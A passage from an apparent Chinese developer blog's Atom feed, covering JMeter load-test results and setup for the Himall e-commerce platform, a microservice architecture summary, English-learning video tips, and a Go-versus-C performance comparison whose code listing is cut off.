&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-19.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;事务处理:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-20.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;测试内容&lt;/th&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;用户登陆&lt;/td&gt;
&lt;td&gt;2000&lt;/td&gt;
&lt;td&gt;4.283秒&lt;/td&gt;
&lt;td&gt;349&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;下单&quot;&gt;&lt;a href=&quot;#下单&quot; class=&quot;headerlink&quot; title=&quot;下单&quot;&gt;&lt;/a&gt;下单&lt;/h4&gt;&lt;p&gt;响应时间:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-21.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;事务处理:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-22.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;测试内容&lt;/th&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;下单&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;4.657秒&lt;/td&gt;
&lt;td&gt;189.1&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&quot;下单流程&quot;&gt;&lt;a href=&quot;#下单流程&quot; class=&quot;headerlink&quot; title=&quot;下单流程&quot;&gt;&lt;/a&gt;下单流程&lt;/h4&gt;&lt;p&gt;响应时间:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-23.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;事务处理:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://binyanbin.github.io/img/hishop-24.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;测试内容&lt;/th&gt;
&lt;th&gt;并发用户数（VU）&lt;/th&gt;
&lt;th&gt;平均响应时间（RT）&lt;/th&gt;
&lt;th&gt;每秒事务数（TPS）&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;购买商品流程&lt;/td&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;15.657秒&lt;/td&gt;
&lt;td&gt;176.8&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;架构设计&quot;&gt;&lt;a href=&quot;#架构设计&quot; class=&quot;headerlink&quot; title=&quot;架构设计&quot;&gt;&lt;/a&gt;架构设计&lt;/h2&gt;&lt;p&gt;集中架构设计出于系统的可扩展性、可维护性以及成本等多方面的因素考虑，逐渐被放弃，转而采用分布式的架构设计。常用分布式架构采用
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Himall架构方案总结</title>
    <link href="http://binyanbin.github.io/2016/06/05/hishop-2/"/>
    <id>http://binyanbin.github.io/2016/06/05/hishop-2/</id>
    <published>2016-06-04T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;这段时间一直做&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Himall&lt;/a&gt;的架构优化，也一直思考什么样的架构设计更合适大型商城系统或者是大型业务系统。从早期的集中化架构到现在的分布式架构，中间经历的各种问题，现在做一个总结。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;集中化架构&quot;&gt;&lt;a href=&quot;#集中化架构&quot; class=&quot;headerlink&quot; title=&quot;集中化架构&quot;&gt;&lt;/a&gt;集中化架构&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/hishop-7.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;Himall早期功能比较少，而且业务相对简单。经过一段时间的开发，一个简单的应用诞生了。同时，集中式设计毫无争议的成为了团队的选择。但是，随着几次迭代开发之后，功能越来越多，业务越来越复杂，这种架构的缺点也渐渐地浮出了水面：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;系统的可维护性受到影响，尤其是那些大型应用&lt;br&gt;多人开发的一个复杂的应用系统，团队人数越多,开发人员必然层次不一，规范难统一，系统模块之间的耦合非常重,模块之间太多相互依赖，非常容易出问题。&lt;/li&gt;
&lt;li&gt;团队开发效率低，协调工作非常多&lt;br&gt;任何改动都会牵涉到多个业务模块,不可能所有开发人员能熟习所有模块，需要与其它业务模块开发人员沟通协调。&lt;/li&gt;
&lt;li&gt;负载均衡不能充分发挥作用&lt;br&gt;集中化架构下的应用即使你做负载均衡，服务器的性能会被所有功能平摊。不能实现服务器性能最大化，也不合适针对特定业务进行特别优化。&lt;br&gt;最终，曾经轻量简洁的应用将会变成一代又一代开发者的噩梦。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;分布式架构&quot;&gt;&lt;a href=&quot;#分布式架构&quot; class=&quot;headerlink&quot; title=&quot;分布式架构&quot;&gt;&lt;/a&gt;分布式架构&lt;/h2&gt;&lt;p&gt;Himall必须寻找到一种方式，将轻量并且质量较好的那部分模块保留下来。也就是找到一个可持续发展的架构，并且在许多次功能迭代开发之后依旧能够让开发人员保持高效开发的开发方式。&lt;/p&gt;
&lt;h3 id=&quot;纵向分解&quot;&gt;&lt;a href=&quot;#纵向分解&quot; class=&quot;headerlink&quot; title=&quot;纵向分解&quot;&gt;&lt;/a&gt;纵向分解&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/img/hishop-8.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;这是一个非常自然而通用的方法，把所有的功能集中到单一的应用中，不如将应用分解成了多个垂直的小模块，它们相互独立，互不影响,独立部署,通过REST请求来传递信息。&lt;/p&gt;
&lt;p&gt;在模块之间共享代码是严令禁止的。当然，在特殊的情况下，如果我们需要分享代码，我们会建公共模块来解决该问题。依就以REST请求来访问代码。如日志功能，配置功能等&lt;/p&gt;
&lt;p&gt;这些模块同样不能共享一个数据库架构，因为这样做会导致模块间的紧密耦合：数据结构的改变会使得一个模块不能够被独立的部署。对于共享数据部分，我们也建立一个公共数据库来解决这个问题，定期或不定期把数据同步到公共数据库中，汇总数据。这个同步工作由Daemon去完成。&lt;/p&gt;
&lt;p&gt;但是一个垂直模块仍旧可能成为一个相对大型的集中化应用。&lt;br&gt;就拿订单来说，订单不仅包括了商品信息，库存验证，会员的积分使用或等及规则，还有商家的各种促销信息，才能算出订单价格，这样订单才可以支付。一个订单模块做下来依就是一个相对大型的集中化应用。因此我们需要继续对垂直模块进行拆分。&lt;/p&gt;
&lt;h3 id=&quot;微服务&quot;&gt;&lt;a href=&quot;#微服务&quot; class=&quot;headerlink&quot; title=&quot;微服务&quot;&gt;&lt;/a&gt;微服务&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/img/hishop-9.jpg&quot; alt=&quot;图&quot;&gt;&lt;br&gt;通过分布式架构继续将模块分解成多个模块。&lt;br&gt;在这种情况下，应用不仅仅被垂直分解，同时还会被水平分解。这种架构中，请求到达应用后，对请求的处理会被分布于多个微服务中，然后每一微服务产生的结果汇总一个响应，发送回请求者。&lt;br&gt;每一个微服务，仅仅集中于一个业务模块中的几个功能,从而达到高内聚低耦合的目的，并且它结构清晰，一个开发者能够很轻松的掌握它。&lt;/p&gt;
&lt;p&gt;一个模块由一个或多个微服务组成,模块之间的调用全由微服务接口完成，每个微服务自带数据存储,可以独立部署。模块可折，微服务可合，这种架构灵活性非常高。&lt;/p&gt;
&lt;h4 id=&quot;微服务负载均衡&quot;&gt;&lt;a href=&quot;#微服务负载均衡&quot; class=&quot;headerlink&quot; title=&quot;微服务负载均衡&quot;&gt;&lt;/a&gt;微服务负载均衡&lt;/h4&gt;&lt;p&gt;由于微服务粒度划分较细，使用负载均衡更能按需扩展那些性能较差的微服务，发挥服务器的最大性能价值。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/hishop-10.jpg&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;在负载均衡中，不同实例的服务通常会分时使用同一个数据库，数据库因此成为了系统的瓶颈，这时我们采用性能更高的nosql数据库，如mongodb。不同微服务使用不同数据库并不会对系造成影响。&lt;/p&gt;
&lt;h4 id=&quot;优点&quot;&gt;&lt;a href=&quot;#优点&quot; class=&quot;headerlink&quot; title=&quot;优点&quot;&gt;&lt;/a&gt;优点&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;微服务非常小，微服务不需要重量级框架和过多的设计，代码相对简单。&lt;/li&gt;
&lt;li&gt;他们能够被独立的部署。因此持续交付或者持续部署变得非常的简单。&lt;/li&gt;
&lt;li&gt;开发者能够为每一个服务选择最适合的开发语言和数据库。不用担心对项目产生影响。&lt;/li&gt;
&lt;li&gt;每个微服务可以独立测试，易于找出性能瓶颈。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&quot;需要解决的问题&quot;&gt;&lt;a href=&quot;#需要解决的问题&quot; class=&quot;headerlink&quot; title=&quot;需要解决的问题&quot;&gt;&lt;/a&gt;需要解决的问题&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;因为微服务数据较大，布署难度加大，需要建立一套更方便的部署机制。&lt;/li&gt;
&lt;li&gt;同样需要建立统一的日志管理模块，方便找查问题。&lt;/li&gt;
&lt;li&gt;同样需要统一配置信息管理.&lt;/li&gt;
&lt;li&gt;公共数据的读写问题，如公共缓存，公共数据库。建立一套有效且高性的方案，来解决读写冲突。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;虽然这些只是这段时间的经验总结，Himall也未完成达到我们所期望的状态，但是我们会继续朝这个访问努力。经过1-2年的迭代之后，我们的架构会更加成熟，经验变得更加丰富。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;这段时间一直做&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot;&gt;Himall&lt;/a&gt;的架构优化，也一直思考什么样的架构设计更合适大型商城系统或者是大型业务系统。从早期的集中化架构到现在的分布式架构，中间经历的各种问题，现在做一个总结。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>英语入门视频推荐</title>
    <link href="http://binyanbin.github.io/2016/05/14/english-2/"/>
    <id>http://binyanbin.github.io/2016/05/14/english-2/</id>
    <published>2016-05-13T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频’Learn English with Jennifer’和’extro English’。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Learn-English-with-Jennifer&quot;&gt;&lt;a href=&quot;#Learn-English-with-Jennifer&quot; class=&quot;headerlink&quot; title=&quot;Learn English with Jennifer&quot;&gt;&lt;/a&gt;Learn English with Jennifer&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/english-1.png&quot; alt=&quot;Learn English with Jennifer&quot;&gt;&lt;br&gt;一个美国英语教师教授一个俄罗斯人英语的教学视频，只有英文字幕，不用看字幕也很容易看懂听懂，非常合适初学者，作为入门视频课程非常合适。&lt;br&gt;&lt;a href=&quot;http://video.1speaking.com/view/index335.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;观看地址&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;extro-English&quot;&gt;&lt;a href=&quot;#extro-English&quot; class=&quot;headerlink&quot; title=&quot;extro English&quot;&gt;&lt;/a&gt;extro English&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/english-2.jpg&quot; alt=&quot;extro English&quot;&gt;&lt;br&gt;这是一个搞笑情景剧,描述几个年轻人浪漫而搞笑的生活故事,可以让你从头笑到尾,只有英文字幕,超级易懂,适合初级或中级能力的学习,对于提高口语和听力具有很好的帮助。&lt;br&gt;&lt;a href=&quot;http://video.1speaking.com/view/index418.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;观看地址&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频’Learn English with Jennifer’和’extro English’。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>jmeter himall电商抢购业务简单测试</title>
    <link href="http://binyanbin.github.io/2016/05/13/jmeter-2/"/>
    <id>http://binyanbin.github.io/2016/05/13/jmeter-2/</id>
    <published>2016-05-12T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;Jmeter是一款比较好的测试工具，我以&lt;a href=&quot;http://www.hishop.com.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hishop&lt;/a&gt;旗下&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Himall&lt;/a&gt;(多用户商城产品)为例，使用jmeter对电商网站的抢购业务建立一个简单测试方案。&lt;/p&gt;
&lt;h2 id=&quot;himall抢购业务的测试&quot;&gt;&lt;a href=&quot;#himall抢购业务的测试&quot; class=&quot;headerlink&quot; title=&quot;himall抢购业务的测试&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;himall&lt;/a&gt;抢购业务的测试&lt;/h2&gt;&lt;p&gt;测试要求:模拟1000用户同时登陆himall商城，同时购买固定活动商品库存，全部下单完成之后，去验证结果。&lt;br&gt;整个测试摸拟过程为:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;登陆 &lt;/li&gt;
&lt;li&gt;频刷活动商品页面 &lt;/li&gt;
&lt;li&gt;下单&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;JMeter设置&quot;&gt;&lt;a href=&quot;#JMeter设置&quot; class=&quot;headerlink&quot; title=&quot;JMeter设置&quot;&gt;&lt;/a&gt;JMeter设置&lt;/h2&gt;整个测试的结构如下图&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;/img/jmeter-6.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;线程组:模拟用户的数量&lt;/li&gt;
&lt;li&gt;聚合报告:测试的性能数据&lt;/li&gt;
&lt;li&gt;查看结果树:具体每个请求的详细信息。&lt;/li&gt;
&lt;li&gt;一个事务控件器:定义从登陆到下单的所有http请求&lt;/li&gt;
&lt;li&gt;HttpCookie管理器:登陆的用户信息在Cookie中，你需要它了保持cookie用户信息&lt;/li&gt;
&lt;li&gt;用户定义变量:记录这次测试指定活动的产品ID及库存ID&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;1.设置模拟用户数1000&lt;br&gt;&lt;img src=&quot;/img/jmeter-7.png&quot; alt=&quot;图&quot;&gt;&lt;/p&gt;
&lt;p&gt;2.设置商品及库存ID&lt;br&gt;&lt;img src=&quot;/img/jmeter-8.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;skuid为库存ID,productid为商品ID。此测试只操作单个库存&lt;/p&gt;
&lt;p&gt;3.设置账号数据&lt;br&gt;&lt;img src=&quot;/img/jmeter-9.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;准备1000个用户名和账号，以.csv保存，用户名与密码以’,’隔开。&lt;/p&gt;
&lt;p&gt;4.设置登陆请求&lt;br&gt;&lt;img src=&quot;/img/jmeter-10.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;设置登陆请求,ip和端口,路径。请求方法:post。重要的是BodyData的内容,其中包括用户名，密码及验证码。&lt;br&gt;__CSVRead是一个读csv文件数据的方法。&lt;br&gt;第一参数为目录:C:\Users\admin\Desktop\jmeterdata\account.csv这是我本地的账户信息文件路径。&lt;br&gt;第二参数指你要读第几列数据，列数由0开始。&lt;br&gt;checkCode 验证码验证&lt;br&gt;keep 是否保持登陆&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;注意:需要在网站代码中注释掉验证环节才可以测试，否则你无法登陆成功。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;4.设置活动页面刷新请求&lt;br&gt;&lt;img src=&quot;/img/jmeter-11.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;设置刷新活动页面次数.10次20次你随便设吧&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/jmeter-12.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;刷活动设置比较简单，就是一个路径，${productid}代表是你自定义的产品ID,couts是购买数量。&lt;/p&gt;
&lt;p&gt;5.设置提交订单请求&lt;br&gt;&lt;img src=&quot;/img/jmeter-13.png&quot; alt=&quot;图&quot;&gt;&lt;br&gt;定单提交页面也是一个路径，这个请求参数相对较多一些，最重要的是设置好库存ID&lt;br&gt;integral:使用积分,没有为0&lt;br&gt;couponIds:红包ID,没有为空&lt;br&gt;skuIds:购买库存ID,${skuid}则是开始配置的库存ID&lt;br&gt;counts:购买数量&lt;br&gt;collpIds:组合购ID，没有为空&lt;br&gt;recieveAddressId:收货地区ID&lt;br&gt;invoiceType:发票类型 0 不要发票 1 增值税发票 2普通发票&lt;br&gt;&amp;amp;invoiceTitle:发票抬头,没有为空&lt;br&gt;invoiceContext:发票内容，没有为空&lt;br&gt;isCashOnDelivery:是否货到付款&lt;/p&gt;
&lt;p&gt;设置完成，你现在可以泡杯茶坐等结果。当然你也可以修改相应相关参数，如摸拟用户数，指定活动页面的刷新次数等，来看看结果会有哪些不同。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Jmeter是一款比较好的测试工具，我以&lt;a href=&quot;http://www.hishop.com.cn/&quot;&gt;Hishop&lt;/a&gt;旗下&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot;&gt;Himall&lt;/a&gt;(多用户商城产品)为例，使用jmeter对电商网站的抢购业务建立一个简单测试方案。&lt;/p&gt;
&lt;h2 id=&quot;himall抢购业务的测试&quot;&gt;&lt;a href=&quot;#himall抢购业务的测试&quot; class=&quot;headerlink&quot; title=&quot;himall抢购业务的测试&quot;&gt;&lt;/a&gt;&lt;a href=&quot;http://www.hishop.com.cn/products/himall/&quot;&gt;himall&lt;/a&gt;抢购业务的测试&lt;/h2&gt;&lt;p&gt;测试要求:模拟1000用户同时登陆himall商城，同时购买固定活动商品库存，全部下单完成之后，去验证结果。&lt;br&gt;整个测试摸拟过程为:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;登陆 &lt;/li&gt;
&lt;li&gt;频刷活动商品页面 &lt;/li&gt;
&lt;li&gt;下单
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>golang是不是后端开发神器</title>
    <link href="http://binyanbin.github.io/2016/05/08/go-1/"/>
    <id>http://binyanbin.github.io/2016/05/08/go-1/</id>
    <published>2016-05-07T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;周末有人介绍golang很合适后端开发，随即把之前C实现的静态资源下载功能(读取服务器上的静态资源文件内容返回给客户端)改成golang实现。然后对比一下效果。&lt;/p&gt;
&lt;h2 id=&quot;实现对比&quot;&gt;&lt;a href=&quot;#实现对比&quot; class=&quot;headerlink&quot; title=&quot;实现对比&quot;&gt;&lt;/a&gt;实现对比&lt;/h2&gt;&lt;p&gt;同样使用标准库,golang实现代码+注释只需要123行,C实现代码+注释412行，golang代码量只有C的1/3。&lt;/p&gt;
&lt;h2 id=&quot;测试对比&quot;&gt;&lt;a href=&quot;#测试对比&quot; class=&quot;headerlink&quot; title=&quot;测试对比&quot;&gt;&lt;/a&gt;测试对比&lt;/h2&gt;&lt;p&gt;我使用的是jmeter测试，首先测试c实现的服务,分别用100,200,300线程并发，每线程访问10。测试数据如下:&lt;br&gt;&lt;img src=&quot;/img/go-1.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-2.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-3.png&quot; alt=&quot;c&quot;&gt;&lt;br&gt;C版实现越测数据越看不下去了，出错率越来越大。接着我测golang实现，我分别用300线程，1000线程和5000线程并发，每线程访问10次。测试数据如下:&lt;br&gt;&lt;img src=&quot;/img/go-4.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-5.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-6.png&quot; alt=&quot;c&quot;&gt;&lt;br&gt;除了响应时间延长，其它都比较稳定，出错率全为0.难道这是传说中的后端神器，难道老板再也不用担心网站访问人数太多当机了，难道我也转golang开发。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;golang实现&quot;&gt;&lt;a href=&quot;#golang实现&quot; class=&quot;headerlink&quot; title=&quot;golang实现&quot;&gt;&lt;/a&gt;golang实现&lt;/h2&gt;&lt;figure class=&quot;highlight go&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span 